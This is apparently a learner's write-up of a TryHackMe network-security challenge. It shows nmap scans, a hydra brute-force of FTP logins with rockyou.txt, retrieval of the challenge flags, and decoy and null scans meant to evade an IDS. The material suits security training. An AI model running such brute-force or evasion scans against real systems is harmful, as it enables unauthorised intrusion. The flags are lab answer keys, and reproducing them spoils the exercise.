---
layout: post
from: THM
---

# Net Sec Challenge
### Practice the skills you have learned in the Network Security module.

Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only `nmap`, `telnet`, and `hydra`.

Answer the questions below

What is the highest port number being open less than 10,000?

There is an open port outside the common 1000 ports; it is above 10,000. What is it?  

How many TCP ports are open?  

What is the flag hidden in the HTTP server header?  

What is the flag hidden in the SSH server header?  

We have an FTP server listening on a nonstandard port. What is the version of the FTP server?  

We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?  

**Note**: I did all but the last one with out looking things up. I spent the whole two hours and ran out of time so i looked up to see what others had done. you can use -D or -sN will work.

Browsing to `http://MACHINE_IP:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?

---
**Nmap**
---
 nmap -sCV 10.10.39.238
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 12:47 PDT
Nmap scan report for 10.10.39.238
Host is up (0.17s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
| ssh-hostkey:
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
|_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
80/tcp   open  http        lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.92%I=7%D=6/27%Time=62BA0971%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");

Host script results:
|_clock-skew: -8m56s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2022-06-27T19:39:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.72 seconds
---
[jmk@arch THM]$ sudo nmap -T5 -v -sCV -p 10000-65535 10.10.39.238
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 12:58 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
 ..  ..
SYN Stealth Scan Timing: About 88.26% done; ETC: 13:04 (0:00:40 remaining)
Discovered open port 10021/tcp on 10.10.39.238
Completed SYN Stealth Scan at 13:04, 346.74s elapsed (55536 total ports)
.. ..
Nmap scan report for 10.10.39.238
Host is up (0.17s latency).
Not shown: 55535 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

---
[jmk@arch THM]$ sudo nmap -sCV -p 10021 10.10.39.238
[sudo] password for jmk:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 13:07 PDT
Nmap scan report for 10.10.39.238
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
---
[jmk@arch THM]$ hydra -L netsecroom.txt -P rockyou.txt -s 10021 ftp://10.10.39.238
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-27 14:02:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ftp://10.10.39.238:10021/
[10021][ftp] host: 10.10.39.238   login: eddie   password: jordan
[10021][ftp] host: 10.10.39.238   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-27 14:02:50
---
[jmk@arch THM]$ ftp 10.10.39.238 10021
Connected to 10.10.39.238.
220 (vsFTPd 3.0.3)
Name (10.10.39.238:jmk): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Sep 20  2021 .
drwxr-xr-x    2 1002     1002         4096 Sep 20  2021 ..
-rw-r--r--    1 1002     1002          220 Sep 14  2021 .bash_logout
-rw-r--r--    1 1002     1002         3771 Sep 14  2021 .bashrc
-rw-r--r--    1 1002     1002          807 Sep 14  2021 .profile
-rw-------    1 1002     1002          723 Sep 20  2021 .viminfo
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
[jmk@arch THM]$ cat ftp_flag.txt
THM{321452667098}
---
**Skip this did not work** *11%*
[jmk@arch ~]$ sudo nmap -sU 10.10.39.238
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 14:03 PDT
Stats: 0:04:59 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 29.52% done; ETC: 14:20 (0:11:56 remaining)
Debugging Increased to 1.
Stats: 0:38:54 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 14:42 (0:00:00 remaining)
Current sending rates: 1.00 packets / s, 27.99 bytes / s.
Overall sending rates: 1.20 packets / s, 52.36 bytes / s.
Nmap scan report for 10.10.39.238
Host is up (0.17s latency).
Scanned at 2022-06-27 14:03:57 PDT for 2347s
Not shown: 841 closed udp ports (port-unreach)
PORT      STATE         SERVICE
7/udp     open|filtered echo
13/udp    open|filtered daytime
17/udp    open|filtered qotd
19/udp    open|filtered chargen
68/udp    open|filtered dhcpc
112/udp   open|filtered mcidas
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
199/udp   open|filtered smux
427/udp   open|filtered svrloc
434/udp   open|filtered mobileip-agent
515/udp   open|filtered printer
623/udp   open|filtered asf-rmcp
643/udp   open|filtered sanity
657/udp   open|filtered rmc
664/udp   open|filtered secure-aux-bus
688/udp   open|filtered realm-rusd
773/udp   open|filtered notify
775/udp   open|filtered acmaint_transd
781/udp   open|filtered hp-collector
789/udp   open|filtered unknown
800/udp   open|filtered mdbs_daemon
902/udp   open|filtered ideafarm-door
959/udp   open|filtered unknown
989/udp   open|filtered ftps-data
1035/udp  open|filtered mxxrlogin
1036/udp  open|filtered nsstp
1057/udp  open|filtered startron
1060/udp  open|filtered polestar
1069/udp  open|filtered cognex-insight
1072/udp  open|filtered cardax
1090/udp  open|filtered ff-fms
1455/udp  open|filtered esl-lm
1718/udp  open|filtered h225gatedisc
1812/udp  open|filtered radius
1886/udp  open|filtered leoip
2343/udp  open|filtered nati-logos
3296/udp  open|filtered rib-slm
4000/udp  open|filtered icq
4045/udp  open|filtered lockd
5093/udp  open|filtered sentinel-lm
6002/udp  open|filtered X11:2
7000/udp  open|filtered afs3-fileserver
8900/udp  open|filtered jmb-cds1
16086/udp open|filtered unknown
16402/udp open|filtered unknown
16548/udp open|filtered unknown
16680/udp open|filtered unknown
16739/udp open|filtered unknown
16896/udp open|filtered unknown
16912/udp open|filtered unknown
16919/udp open|filtered unknown
16970/udp open|filtered unknown
16974/udp open|filtered unknown
17091/udp open|filtered unknown
17146/udp open|filtered unknown
17184/udp open|filtered unknown
17331/udp open|filtered unknown
17338/udp open|filtered unknown
17417/udp open|filtered unknown
17468/udp open|filtered unknown
17490/udp open|filtered unknown
17573/udp open|filtered unknown
17845/udp open|filtered unknown
17888/udp open|filtered unknown
18485/udp open|filtered unknown
18543/udp open|filtered unknown
18985/udp open|filtered unknown
19017/udp open|filtered unknown
19047/udp open|filtered unknown
19096/udp open|filtered unknown
19161/udp open|filtered unknown
19222/udp open|filtered unknown
19283/udp open|filtered keysrvr
19374/udp open|filtered unknown
19504/udp open|filtered unknown
19936/udp open|filtered unknown
19956/udp open|filtered unknown
20120/udp open|filtered unknown
20206/udp open|filtered unknown
20309/udp open|filtered unknown
20424/udp open|filtered unknown
20464/udp open|filtered unknown
20465/udp open|filtered unknown
20522/udp open|filtered unknown
20851/udp open|filtered unknown
20876/udp open|filtered unknown
20884/udp open|filtered unknown
21186/udp open|filtered unknown
21212/udp open|filtered unknown
21247/udp open|filtered unknown
21320/udp open|filtered unknown
21568/udp open|filtered unknown
21576/udp open|filtered unknown
21609/udp open|filtered unknown
21702/udp open|filtered unknown
21784/udp open|filtered unknown
21967/udp open|filtered unknown
22124/udp open|filtered unknown
23176/udp open|filtered unknown
24854/udp open|filtered unknown
25280/udp open|filtered unknown
26966/udp open|filtered unknown
27195/udp open|filtered unknown
28465/udp open|filtered unknown
28973/udp open|filtered unknown
29256/udp open|filtered unknown
29823/udp open|filtered unknown
29977/udp open|filtered unknown
30263/udp open|filtered unknown
30303/udp open|filtered unknown
30718/udp open|filtered unknown
31059/udp open|filtered unknown
31731/udp open|filtered unknown
32774/udp open|filtered sometimes-rpc12
32815/udp open|filtered unknown
33355/udp open|filtered unknown
34796/udp open|filtered unknown
36384/udp open|filtered unknown
36669/udp open|filtered unknown
37761/udp open|filtered unknown
37843/udp open|filtered unknown
38293/udp open|filtered landesk-cba
39632/udp open|filtered unknown
39714/udp open|filtered unknown
39888/udp open|filtered unknown
41081/udp open|filtered unknown
43094/udp open|filtered unknown
43195/udp open|filtered unknown
43686/udp open|filtered unknown
44160/udp open|filtered unknown
44253/udp open|filtered unknown
45380/udp open|filtered unknown
46093/udp open|filtered unknown
47624/udp open|filtered directplaysrvr
47772/udp open|filtered unknown
48189/udp open|filtered unknown
48255/udp open|filtered unknown
48455/udp open|filtered unknown
49188/udp open|filtered unknown
49193/udp open|filtered unknown
49201/udp open|filtered unknown
49211/udp open|filtered unknown
49215/udp open|filtered unknown
49968/udp open|filtered unknown
50164/udp open|filtered unknown
50708/udp open|filtered unknown
51255/udp open|filtered unknown
51690/udp open|filtered unknown
54114/udp open|filtered unknown
54711/udp open|filtered unknown
54925/udp open|filtered unknown
55043/udp open|filtered unknown
57410/udp open|filtered unknown
60423/udp open|filtered unknown
61142/udp open|filtered unknown
61322/udp open|filtered unknown
62154/udp open|filtered unknown
62287/udp open|filtered unknown
Final times for host: srtt: 165794 rttvar: 2260  to: 174834

Read from /usr/bin/../share/nmap: nmap-payloads nmap-services.
Nmap done: 1 IP address (1 host up) scanned in 2347.45 seconds
---
[jmk@arch ~]$ sudo nmap -sN 10.10.22.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 15:01 PDT
Nmap scan report for 10.10.22.40
Host is up (0.17s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.95 seconds
0 %

Chance of scan being detected

Your mission is to use Nmap to scan **10.10.22.40** (this machine)  
as covertly as possible and avoid being detected by the IDS.  

Exercise Complete! Task answer: THM{f7443f99}
	*also would have worked*
	sudo nmap -D 10.10.0.1,10.10.0.2,**My_IP** -T4 -sN *Target_IP*

